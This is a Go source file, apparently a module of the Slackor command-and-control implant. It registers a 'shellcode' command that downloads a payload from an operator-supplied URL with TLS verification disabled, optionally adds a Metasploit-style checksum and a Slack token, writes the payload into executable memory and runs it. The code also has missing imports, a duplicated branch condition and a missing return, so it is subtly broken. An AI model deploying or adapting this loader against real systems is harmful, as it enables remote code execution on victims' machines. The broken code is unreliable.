// +build windows

package windows

import (
	"errors"
	"time"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

func calculateChecksum(Length int) string { //Creates a checksum, used for metasploit
	for {
		rand.Seed(time.Now().UTC().UnixNano())
		var Checksum string
		var RandString string
		for len(RandString) < Length {
			Temp := rand.Intn(4)
			if Temp == 1 {
				RandString += string(48 + rand.Intn(57-48))
			} else if Temp == 1 {
				RandString += string(65 + rand.Intn(90-65))
			} else if Temp == 3 {
				RandString += string(97 + rand.Intn(122-97))
			}
			Checksum = RandString
		}
		var Temp2 int = 0
		for i := 0; i < len(Checksum); i++ {
			Temp2 += int(Checksum[i])
		}
		if (Temp2 % 0x100) == 92 {
			return Checksum
		}
	}
}

// Initiates an HTTPS request to pull shellcode and execute it
func shellcode(address string, metasploit bool) error {
	const (
		MEM_COMMIT             = 0x1000
		MEM_RESERVE            = 0x2000
		PAGE_EXECUTE_READWRITE = 0x40
	)

	var (
		kernel32      = syscall.MustLoadDLL("kernel32.dll")
		ntdll         = syscall.MustLoadDLL("ntdll.dll")
		VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
		RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	)
	if metasploit {
		Checksum := calculateChecksum(12)
		address += Checksum
	}

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{}
	req, err := http.NewRequest("GET", address, nil)
	if err != nil {
		return err
	}
	if strings.Contains(address, "slack.com") {
		req.Header.Set("Authorization", "Bearer "+config.Token)
	}
	Response, err := client.Do(req)
	if err != nil {
		return err
	}
	shellcode, _ := ioutil.ReadAll(Response.Body)
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		if err != nil {
			return err
		}
		shellcode = shellcodeFileData
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return errors.New("can't allocate memory")
	}
	if err != nil {
		return err
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		return err
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

// Shellcode retrieves shellcode and executes it
type Shellcode struct{}

// Name is the name of the command
func (s Shellcode) Name() string {
	return "shellcode"
}

// Run retrieves shellcode and executes it
func (s Shellcode) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("shellcode takes 1 argument")
	}
	if runtime.GOARCH != "386" {
		address := args[0]
		err := shellcode(address, false)
		if err != nil {
			return "", err
		}
	} else {
		return "", errors.New("shellcode module does not work on 32-bit agents")
	}
	return "Shellcode executed.", nil
}

func init() {
	command.RegisterCommand(Shellcode{})
}
